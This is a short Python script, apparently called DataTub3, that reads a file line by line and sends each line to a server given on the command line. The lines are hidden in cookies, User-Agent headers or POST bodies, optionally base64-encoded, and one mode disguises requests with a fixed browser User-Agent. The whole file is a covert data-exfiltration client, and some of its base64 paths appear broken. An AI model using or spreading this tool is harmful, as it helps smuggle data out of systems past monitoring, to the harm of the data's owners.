#!/usr/bin/python
#coding: utf-8
import requests
import argparse
import base64

def banner():
    print ("""  ____        _       _____      _    _____ 
 |  _ \  __ _| |_ __ |_   _|   _| |__|___ / 
 | | | |/ _` | __/ _` || || | | | '_ \ |_ \ 
 | |_| | (_| | || (_| || || |_| | |_) |__) |
 |____/ \__,_|\__\__,_||_| \__,_|_.__/____/ """)
    print ("\n")

banner()
parser = argparse.ArgumentParser(description = 'CLIENT LINUX')
parser.add_argument('-u',
    dest = 'url',
    required = True,
    help = 'IP receive the Packet')
parser.add_argument('--cookie',
    dest = 'Cookie',
    help = 'Receive Text Clear inside Cookie')
parser.add_argument('--cookie-b64',
    dest = 'CookieB64',
    help = 'Receive base64 inside Cookie')
parser.add_argument('--useragent',
    dest = 'UserAgent',
    help = 'Receive Text Clear inside User-Agent')
parser.add_argument('--useragent-b64',
    dest = 'UserAgentB64',
    help = 'Receive base64 inside User-Agent')
parser.add_argument('--post',
    dest = 'uRpost',
    help = 'Receive Text Clear inside POST')
parser.add_argument('--post-b64',
    dest = 'uRpostB64',
    help = 'Receive base64 inside POST')
args = parser.parse_args()

def send_ua (url, UserAgent):
    headers = {'user-agent': str(UserAgent)}
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        print ("Houston, Server ON !!!")
        print ("Packet delivered.")
    else:
        print ("Houston, We have a problem!")
        print ("Server OFF !!!")

def send_uab64 (url, UserAgentB64):
    b64 = base64.b64encode(UserAgentB64)
    headers = {'user-agent': str(b64)}
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        print ("Houston, Server ON !!!")
        print ("Packet delivered.")
    else:
        print ("Houston, We have a problem!")
        print ("Server OFF !!!")

def send_co (url, cookie_data):
    cookie2 = {"cookie": cookie_data}
    r = requests.get(url,cookies=cookie2)
    if r.status_code == 200:
        print ("Houston, Server ON !!!")
        print ("Packet delivered.")
    else:
        print ("Houston, We have a problem!")
        print ("Server OFF !!!")

def send_co64 (url, CookieB64):
    b64 = base64.b64encode(CookieB64)
    cookie2 = {"cookie": b64}
    r = requests.get(url,cookies=cookie2)
    if r.status_code == 200:
        print ("Houston, Server ON !!!")
        print ("Packet delivered.")
    else:
        print ("Houston, We have a problem!")
        print ("Server OFF !!!")

def send_Post (url, uRpost):
    headers = {'user-agent': 'Chrome/71.0.3578.98 Safari/537.36'}
    r = requests.post(url, data=uRpost, headers=headers)
    if r.status_code == 200:
        print ("Houston, Server ON !!!")
        print ("Packet delivered.")
    else:
        print ("Houston, We have a problem!")
        print ("Server OFF !!!")

def send_Post64 (url, uRpostB64):
    headers = {'user-agent': 'Chrome/71.0.3578.98 Safari/537.36'}
    b = uRpostB64.encode("UTF-8")
    data = base64.b64encode(b)

    r = requests.post(url, headers=headers, data=data)
    if r.status_code == 200:
        print ("Houston, Server ON !!!")
        print ("Packet delivered.")
    else:
        print ("Houston, We have a problem!")
        print ("Server OFF !!!")

if __name__ == "__main__":

    if args.Cookie:
        with open(args.Cookie, "r+") as arq:
            path = arq.readlines() 
        for i in path:
            i = i.rstrip() 
            send_co(args.url,i) 

    elif args.CookieB64:
        with open(args.CookieB64, "r+") as arq:
            path = arq.readlines() 
        for j in path:
            j = j.rstrip() 
            send_co64(args.url,j) 

    elif args.UserAgent:
        with open(args.UserAgent, "r+") as arq:
            path = arq.readlines() 
        for i in path:
            i = i.rstrip() 
            send_ua(args.url,i)

    elif args.UserAgentB64:
        with open(args.UserAgentB64, "r+") as arq:
            path = arq.readlines() 
        for j in path:
            j = j.rstrip() 
            send_uab64(args.url,j) 

    elif args.uRpost:
        with open(args.uRpost, "r+") as arq:
            path = arq.readlines() 
        for i in path:
            i = i.rstrip() 
            send_Post(args.url,i)

    elif args.uRpostB64:
        with open(args.uRpostB64, "r+") as arq:
            path = arq.readlines() 
        for j in path:
            j = j.rstrip() 
            send_Post64(args.url,j)
